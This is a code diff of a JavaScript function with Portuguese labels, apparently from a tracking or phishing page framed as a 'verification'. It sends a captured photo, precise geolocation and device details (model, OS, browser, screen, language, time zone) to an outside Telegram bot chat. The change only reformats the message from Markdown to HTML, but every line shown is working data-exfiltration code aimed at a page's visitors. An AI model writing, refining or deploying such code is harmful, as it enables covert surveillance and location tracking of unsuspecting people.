@@ -264,25 +264,25 @@
 
     async function enviarTelegram(foto, loc, info) {
         const locTexto = loc
-            ? `[Ver no mapa](https://maps.google.com/?q=${loc.lat},${loc.lon}) — precisão ${loc.acc}m`
-            : '❌ Não concedida';
+            ? `<a href="https://maps.google.com/?q=${loc.lat},${loc.lon}">Ver no mapa</a> - precisao ${loc.acc}m`
+            : 'Nao concedida';
 
         const caption =
-            `🚨 *NOVA VERIFICAÇÃO*\n\n` +
-            `📱 *Dispositivo:* ${info.device}\n` +
-            `💻 *Sistema:* ${info.os}\n` +
-            `🌐 *Navegador:* ${info.browser}\n` +
-            `📐 *Tela:* ${info.tela}\n` +
-            `🌍 *Idioma:* ${info.idioma}\n` +
-            `🕐 *Fuso:* ${info.fuso}\n\n` +
-            `📅 *Data/Hora:* ${info.now}\n\n` +
-            `📍 *Localização:* ${locTexto}`;
+            `🚨 <b>NOVA VERIFICACAO</b>\n\n` +
+            `📱 <b>Dispositivo:</b> ${info.device}\n` +
+            `💻 <b>Sistema:</b> ${info.os}\n` +
+            `🌐 <b>Navegador:</b> ${info.browser}\n` +
+            `📐 <b>Tela:</b> ${info.tela}\n` +
+            `🌍 <b>Idioma:</b> ${info.idioma}\n` +
+            `🕐 <b>Fuso:</b> ${info.fuso}\n\n` +
+            `📅 <b>Data/Hora:</b> ${info.now}\n\n` +
+            `📍 <b>Localizacao:</b> ${locTexto}`;
 
         const form = new FormData();
         form.append('chat_id',    CHAT_ID);
         form.append('photo',      foto, 'foto.jpg');
         form.append('caption',    caption);
-        form.append('parse_mode', 'Markdown');
+        form.append('parse_mode', 'HTML');
 
         const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
             method: 'POST',
